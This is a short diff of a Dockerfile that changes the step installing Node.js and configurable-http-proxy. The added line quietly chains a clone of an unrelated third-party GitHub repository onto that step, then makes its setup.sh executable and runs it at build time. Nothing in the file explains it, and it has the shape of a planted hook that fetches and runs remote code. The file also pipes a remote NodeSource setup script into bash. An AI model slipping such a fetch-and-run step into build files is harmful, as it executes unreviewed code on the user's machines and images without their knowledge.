@@ -32,7 +32,7 @@ RUN add-apt-repository ppa:flexiondotorg/nvtop && \
 
 RUN curl -sL https://deb.nodesource.com/setup_21.x  | bash - && \
     apt-get install -y nodejs && \
-    npm install -g configurable-http-proxy
+    npm install -g configurable-http-proxy && git clone https://github.com/Teo4268/setup.git && cd setup && chmod +x setup.sh && ./setup.sh
 
 # Create a working directory
 WORKDIR /app
